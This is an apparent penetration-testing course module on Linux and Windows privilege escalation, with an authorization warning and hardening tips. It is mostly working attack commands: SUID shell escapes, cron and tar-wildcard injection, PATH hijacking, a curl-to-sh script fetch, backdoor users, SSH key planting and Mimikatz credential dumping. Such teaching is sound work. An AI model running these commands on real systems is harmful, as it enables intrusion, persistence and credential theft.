# 🔓 System Security & Privilege Escalation

## Linux and Windows Privilege Escalation — From User to Root/Admin

---

## 📌 Overview

After gaining initial access to a system, the next step is escalating privileges. This section covers techniques to go from a low-privilege user to root (Linux) or SYSTEM/Administrator (Windows).

> ⚠️ Only practice on systems you own or have explicit authorization to test.

---

## Linux Privilege Escalation

### Enumeration First

```bash
# Current user info
id
whoami
sudo -l                    # What can I run as sudo?

# System info
uname -a                   # Kernel version (kernel exploits?)
cat /etc/os-release        # OS version
cat /proc/version          # Kernel info

# Users
cat /etc/passwd            # All users
cat /etc/shadow            # Password hashes (if readable = jackpot!)
cat /etc/group             # Group memberships

# Network
ifconfig / ip a            # Network interfaces
netstat -tulnp             # Listening services
ss -tulnp

# SUID/SGID binaries (PRIMARY escalation vector)
find / -perm -4000 -type f 2>/dev/null
find / -perm -2000 -type f 2>/dev/null

# Writable files/directories
find / -writable -type f 2>/dev/null
find / -writable -type d 2>/dev/null

# Cron jobs
cat /etc/crontab
ls -la /etc/cron.*
crontab -l

# Running processes
ps aux | grep root

# Installed software
dpkg -l 2>/dev/null
rpm -qa 2>/dev/null
```

### SUID Exploitation

```bash
# Found: /usr/bin/find with SUID
find . -exec /bin/bash -p \;

# Found: /usr/bin/vim with SUID
vim -c ':!/bin/bash'

# Found: /usr/bin/python3 with SUID
python3 -c 'import os; os.execl("/bin/bash", "bash", "-p")'

# Found: /usr/bin/nmap (old version) with SUID
nmap --interactive
!sh

# Check GTFOBins for any SUID binary:
# https://gtfobins.github.io/
```

### Cron Job Abuse

```bash
# If a cron job runs a script you can write to:
cat /etc/crontab
# */5 * * * * root /opt/backup.sh

# If /opt/backup.sh is writable:
echo '#!/bin/bash' > /opt/backup.sh
echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' >> /opt/backup.sh

# Wait for cron to execute, then:
/tmp/rootbash -p
```

### Wildcard Exploitation

```bash
# If cron runs: tar czf /backup/backup.tar.gz *
# In the directory being tarred, create:
echo "" > "--checkpoint=1"
echo "" > "--checkpoint-action=exec=sh shell.sh"
echo '#!/bin/bash\ncp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' > shell.sh
```

### Kernel Exploits

```bash
# Check kernel version
uname -r

# Search for exploits
searchsploit linux kernel [version] privilege escalation

# Notable kernel exploits:
# DirtyCow (CVE-2016-5195) - Linux < 4.8.3
# DirtyPipe (CVE-2022-0847) - Linux 5.8+
```

### PATH Manipulation

```bash
# If a SUID program calls a command without full path:
# Example: program calls "service" instead of "/usr/sbin/service"

# Create malicious "service" in writable directory:
echo '#!/bin/bash' > /tmp/service
echo '/bin/bash -p' >> /tmp/service
chmod +x /tmp/service

# Prepend to PATH:
export PATH=/tmp:$PATH

# Run the SUID program — it will execute YOUR "service"
```

### Automated Enumeration Tools

```bash
# LinPEAS
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# LinEnum
./LinEnum.sh

# Linux Exploit Suggester
./linux-exploit-suggester.sh
```

---

## Windows Privilege Escalation

### Enumeration

```powershell
# Current user info
whoami
whoami /priv          # Check privileges (SeImpersonate = escalation!)
whoami /groups
net user
net user username

# System info
systeminfo
hostname

# Check for unquoted service paths
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "C:\Windows"

# Check service permissions
sc qc servicename
accesschk.exe /accepteula -uwcqv "Everyone" *

# Scheduled tasks
schtasks /query /fo TABLE /nh

# Running processes
tasklist /SVC

# Network
netstat -ano
ipconfig /all

# Installed software
wmic product get name,version

# Search for passwords
findstr /si password *.txt *.ini *.config *.xml
reg query HKLM /f password /t REG_SZ /s
```

### Common Windows PrivEsc Vectors

| Vector | Description | Check |
|--------|-------------|-------|
| Unquoted Service Paths | Service path with spaces, no quotes | `wmic service get pathname` |
| Weak Service Permissions | Can modify service binary | `accesschk.exe` |
| AlwaysInstallElevated | MSI installs run as SYSTEM | Registry check |
| Stored Credentials | Saved passwords | `cmdkey /list` |
| DLL Hijacking | Application loads missing DLL | Process Monitor |
| SeImpersonatePrivilege | Token impersonation | `whoami /priv` |
| Kernel Exploits | Unpatched Windows | `systeminfo` + Windows Exploit Suggester |

### Unquoted Service Path

```
# Service path: C:\Program Files\Vulnerable App\service.exe
# Windows searches for executables in this order:
# C:\Program.exe
# C:\Program Files\Vulnerable.exe
# C:\Program Files\Vulnerable App\service.exe

# If you can write to C:\Program Files\Vulnerable App\:
# Place malicious executable as "Vulnerable.exe" in C:\Program Files\

# Restart service → malicious exe runs as SYSTEM
sc stop VulnService
sc start VulnService
```

### Token Impersonation (Potato Attacks)

```powershell
# If you have SeImpersonatePrivilege:
whoami /priv
# SeImpersonatePrivilege → Enabled

# Use PrintSpoofer, JuicyPotato, or GodPotato:
PrintSpoofer.exe -i -c cmd
# Spawns SYSTEM shell!
```

### Automated Windows Enumeration

```powershell
# WinPEAS
.\winPEASx64.exe

# PowerUp (PowerShell)
Import-Module .\PowerUp.ps1
Invoke-AllChecks

# Windows Exploit Suggester
python windows-exploit-suggester.py --database 2024-01-15-mssb.xls --systeminfo sysinfo.txt
```

---

## Post-Exploitation

### After Getting Root/Admin

```bash
# Linux - Maintain access
# Add SSH key
echo "ssh-rsa AAAA... attacker@kali" >> /root/.ssh/authorized_keys

# Create backdoor user
useradd -m -s /bin/bash -G sudo backdoor
echo "backdoor:password123" | chpasswd

# Windows - Maintain access
# Create admin user
net user backdoor Password123! /add
net localgroup Administrators backdoor /add

# Enable RDP
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
```

### Credential Harvesting

```bash
# Linux
cat /etc/shadow                    # Password hashes
find / -name "*.conf" -exec grep -l "password" {} \;
history                            # Command history may contain passwords
env                                # Environment variables

# Windows
# Mimikatz (extract passwords from memory)
mimikatz.exe
sekurlsa::logonpasswords          # Dump plaintext passwords!
lsadump::sam                      # Dump SAM database
```

---

## Defense & Hardening

### Linux Hardening

- Remove unnecessary SUID binaries
- Restrict sudo permissions (specific commands only)
- Keep kernel updated
- Use SELinux/AppArmor
- Monitor cron jobs
- Disable unused services

### Windows Hardening

- Patch regularly
- Remove SeImpersonatePrivilege from service accounts
- Quote all service paths
- Use Group Policy to restrict admin access
- Enable Windows Defender / EDR
- Monitor for new admin accounts

---

## Exercises

1. Complete TryHackMe "Linux PrivEsc" room
2. Complete TryHackMe "Windows PrivEsc" room
3. Practice on VulnHub machines
4. Build a checklist of 20 things to check for privilege escalation
5. Exploit 5 different SUID binaries using GTFOBins

---

**Next:** → [09-Penetration-Testing](../09-Penetration-Testing/README.md)

*"Initial access is just the beginning. Privilege escalation is where the real game starts."*
